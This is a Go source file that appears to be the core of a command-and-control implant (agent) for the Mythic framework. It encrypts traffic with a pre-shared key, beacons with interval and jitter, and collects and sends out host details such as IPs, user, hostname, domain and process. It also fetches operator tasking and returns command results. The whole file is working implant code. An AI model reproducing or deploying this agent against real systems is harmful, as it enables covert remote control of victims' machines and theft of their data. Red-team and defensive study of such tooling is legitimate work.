package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
)

// Agent holds live session state: negotiated callback UUID, config and keys.
type Agent struct {
	cfg       Config
	uuid      string
	psk       []byte
	transport exchanger
	interval  int
	jitter    int
}

func newAgent(c Config) (*Agent, error) {
	t, err := newTransport(c)
	if err != nil {
		return nil, err
	}
	var psk []byte
	if c.Crypto == "aes256_hmac" {
		psk, err = base64.StdEncoding.DecodeString(c.PSK)
		if err != nil {
			return nil, fmt.Errorf("psk: %w", err)
		}
	}
	interval := c.CallbackInterval
	if interval < 0 {
		interval = 0
	}
	return &Agent{cfg: c, uuid: c.PayloadUUID, psk: psk, transport: t, interval: interval, jitter: c.CallbackJitter}, nil
}

func (a *Agent) roundTrip(outerUUID string, payload any) ([]byte, error) {
	msg, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	sealed, err := sealRaw(outerUUID, msg, a.cfg.Crypto, a.psk)
	if err != nil {
		return nil, err
	}
	raw, err := a.transport.exchange(sealed)
	if err != nil {
		return nil, err
	}
	_, out, err := openRaw(raw, a.cfg.Crypto, a.psk)
	return out, err
}

type checkinResponse struct {
	Action string `json:"action"`
	ID     string `json:"id"`
	Status string `json:"status"`
}

// checkin registers the payload and adopts the callback UUID Mythic returns.
func (a *Agent) checkin() error {
	info := collectSysinfo()
	payload := map[string]any{
		"action":       "checkin",
		"uuid":         a.cfg.PayloadUUID,
		"ips":          info.ips,
		"os":           info.os,
		"user":         info.user,
		"host":         info.host,
		"pid":          info.pid,
		"architecture": info.arch,
		"domain":       info.domain,
		"process_name": info.process,
	}
	out, err := a.roundTrip(a.cfg.PayloadUUID, payload)
	if err != nil {
		return err
	}
	var resp checkinResponse
	if err := json.Unmarshal(out, &resp); err != nil {
		return err
	}
	if resp.Status != "success" || resp.ID == "" {
		return fmt.Errorf("checkin rejected: status=%q", resp.Status)
	}
	a.uuid = resp.ID
	return nil
}

// Task is one Mythic tasking entry. Parameters arrives as a JSON blob string.
type Task struct {
	Command    string  `json:"command"`
	Parameters string  `json:"parameters"`
	ID         string  `json:"id"`
	Timestamp  float64 `json:"timestamp"`
}

type taskingResponse struct {
	Action string `json:"action"`
	Tasks  []Task `json:"tasks"`
}

func (a *Agent) getTasking() ([]Task, error) {
	out, err := a.roundTrip(a.uuid, map[string]any{
		"action":       "get_tasking",
		"tasking_size": a.cfg.TaskingSize,
	})
	if err != nil {
		return nil, err
	}
	var resp taskingResponse
	if err := json.Unmarshal(out, &resp); err != nil {
		return nil, err
	}
	return resp.Tasks, nil
}

// Response is one completed task result for post_response.
type Response struct {
	TaskID     string `json:"task_id"`
	UserOutput string `json:"user_output"`
	Completed  bool   `json:"completed"`
	Status     string `json:"status"`
}

func (a *Agent) postResponses(responses []Response) error {
	_, err := a.roundTrip(a.uuid, map[string]any{
		"action":    "post_response",
		"responses": responses,
	})
	return err
}

// taskArg extracts the "arguments" string from a task's parameters blob.
// Falls back to the raw string when parameters is not JSON.
func taskArg(parameters string) string {
	var decoded map[string]any
	if err := json.Unmarshal([]byte(parameters), &decoded); err != nil {
		return parameters
	}
	if v, ok := decoded["arguments"].(string); ok {
		return v
	}
	return parameters
}
